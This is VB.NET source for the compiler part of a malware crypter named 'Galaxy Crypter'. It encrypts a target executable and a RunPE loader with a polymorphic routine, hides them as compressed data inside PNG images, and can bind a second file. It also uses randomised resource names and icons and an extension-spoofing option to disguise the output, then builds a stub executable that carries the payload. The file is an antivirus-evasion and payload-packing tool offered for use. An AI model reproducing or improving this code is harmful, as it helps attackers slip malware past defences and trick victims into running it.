Imports System.Text
Imports System.Resources
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression

Public Class Compiler
    Private Shared Function xorData(pEncryptedData As Byte(), pKey As Byte()) As Byte()
        Dim result As Byte() = New Byte(pEncryptedData.Length) {}
        Dim keyOffset As Integer = 0
        For i As Integer = 0 To result.Length - 1
            result(i) = CByte(pEncryptedData(i) Xor pKey(keyOffset))
            keyOffset += 1
            If keyOffset = pKey.Length Then
                keyOffset = 0
            End If
        Next
        Return result
    End Function

    Private Shared Function Compress(plainData As Byte()) As Byte()
        Dim compressesData As Byte() = Nothing
        Using outputStream As New MemoryStream()
            Using zip As New GZipStream(outputStream, CompressionMode.Compress)
                zip.Write(plainData, 0, plainData.Length)
            End Using
            compressesData = outputStream.ToArray()
        End Using
        Return compressesData
    End Function
    Public Shared Sub InitalizeCompile(stub As String, saveas As String, runpe As Byte())
        If Not saveas = Nothing Then
            Dim myFile As Byte() = IO.File.ReadAllBytes(compileStructure.exeFile)


            Dim enc_myFile As Byte()
            Dim encRunpe As Byte()

            enc_myFile = PolyMorphicStairs.PolyCrypt(myFile, Encoding.Unicode.GetBytes(compileStructure.encryptionKey))
            encRunpe = PolyMorphicStairs.PolyCrypt(runpe, Encoding.Unicode.GetBytes(compileStructure.encryptionKey))
            compileStructure.resFileName = Misc.GeneratePassword(Misc.r.Next(8, 12))
            compileStructure.resPEfile = Misc.GeneratePassword(Misc.r.Next(8, 12))
            If Not compileStructure.bindFile = Nothing Then
                Dim myBind As Byte() = IO.File.ReadAllBytes(compileStructure.bindFile)
                Dim enc_myBind As Byte() = PolyMorphicStairs.PolyCrypt(myBind, Encoding.Unicode.GetBytes(compileStructure.encryptionKey))
                Dim bBind As Bitmap = Pixelate.Forward(Compress(enc_myBind))
                compileStructure.redbFile = Misc.GeneratePassword(Misc.r.Next(8, 12))
                bBind.Save(compileStructure.redbFile & ".png")
            End If
            Dim bRunpe As Bitmap = Pixelate.Forward(Compress(encRunpe)) 'createBitmap(compressData(encRunpe))
            Dim bFile As Bitmap = Pixelate.Forward(Compress(enc_myFile))
            ' IO.File.WriteAllBytes(compileStructure.resPEfile & ".bin", Compress(encRunpe))
            'IO.File.WriteAllBytes(compileStructure.resFileName & ".bin", Compress(enc_myFile))
            bRunpe.Save(compileStructure.resPEfile & ".png")
            bFile.Save(compileStructure.resFileName & ".png")
            compileStructure.resico1 = Misc.GeneratePassword(Misc.r.Next(8, 12))
            compileStructure.resico2 = Misc.GeneratePassword(Misc.r.Next(8, 12))

            createIcon(16, compileStructure.resico1 & ".ico")
            createIcon(16, compileStructure.resico2 & ".ico")
            Compile(stub, saveas, "File crypt opperation complete!", compileStructure.iconFile)
        Else
            MessageBox.Show("Please select a valid save location and retry!", "Galaxy Compiler", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub
    Private Shared Sub Compile(ByVal Source As String, ByVal Out As String, ByVal SuccessTxt As String, Optional ByVal Icon As String = Nothing)
        Dim ProviderOptions As New Dictionary(Of String, String)()
        ProviderOptions.Add("CompilerVersion", "v2.0")
        Dim CP As New Microsoft.VisualBasic.VBCodeProvider(ProviderOptions)
        Dim P As New CodeDom.Compiler.CompilerParameters
        Dim s As New StringBuilder()
        s.Append(" /target:winexe")
        s.Append(" /platform:x86")
        s.Append(" /utf8output")
        If Not Icon = Nothing Then s.Append(" /win32icon:" + Icon)
        P.GenerateExecutable = True
        If Not compileStructure.spoof = Nothing Then
            Out = Out.Replace(".exe", compileStructure.spoof & ".exe")
        End If
        P.OutputAssembly = Out
        P.CompilerOptions += s.ToString()
        P.IncludeDebugInformation = False
        P.EmbeddedResources.Add(compileStructure.resPEfile & ".png") '(compileStructure.resPEfile & ".resources")
        P.EmbeddedResources.Add(compileStructure.resFileName & ".png") ' (compileStructure.resFileName & ".resources")
        If Not compileStructure.bindFile = Nothing Then
            P.EmbeddedResources.Add(compileStructure.redbFile & ".png")
        End If
        P.EmbeddedResources.Add(compileStructure.resico1 & ".ico")
        P.EmbeddedResources.Add(compileStructure.resico2 & ".ico")
        P.ReferencedAssemblies.Add("System.Dll")
        P.ReferencedAssemblies.Add("System.Drawing.Dll")
        P.ReferencedAssemblies.Add("System.Windows.Forms.Dll")
        P.MainClass = "this_Name.stubTest"

        Dim Results1 = CP.CompileAssemblyFromSource(P, Source)
        For Each uii As CodeDom.Compiler.CompilerError In Results1.Errors
            MessageBox.Show(uii.ToString, "Compiler Error")
        Next
        Try
            IO.File.Delete(compileStructure.resFileName & ".png")
            '  IO.File.Delete(compileStructure.resPEfile & ".png")
            IO.File.Delete(compileStructure.resico1 & ".ico")
            IO.File.Delete(compileStructure.resico2 & ".ico")
            If Not compileStructure.redbFile = Nothing Then
                IO.File.Delete(compileStructure.redbFile & ".png")
            End If
        Catch
        End Try
        MessageBox.Show(SuccessTxt, "Galaxy Crypter", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub
    Private Shared Sub createIcon(pSize As Integer, path As String)
        Dim rnd As New Random()
        Dim icon As New Bitmap(pSize, pSize)
        For x As Integer = 0 To icon.Width - 1
            For y As Integer = 0 To icon.Height - 1
                icon.SetPixel(x, y, Color.FromArgb(rnd.[Next](0, 255), rnd.[Next](0, 255), rnd.[Next](0, 255), rnd.[Next](0, 255)))
            Next
        Next
        icon.Save(path, ImageFormat.Icon)
    End Sub
End Class
Public Class compileStructure
    Public Class EOF
        Public Shared useEOF As Boolean = False
        Public Shared eofStr As String = Nothing
    End Class
    Public Shared resico1 As String = Nothing
    Public Shared resico2 As String = Nothing
    Public Shared resFileName As String = Nothing
    Public Shared resPEfile As String = Nothing
    Public Shared exeFile As String = Nothing
    Public Shared redbFile As String = Nothing
    Public Shared bindFile As String = Nothing
    Public Shared encryptionKey As String = Nothing
    Public Shared iconFile As String = Nothing
    Public Shared spoof As String = Nothing
End Class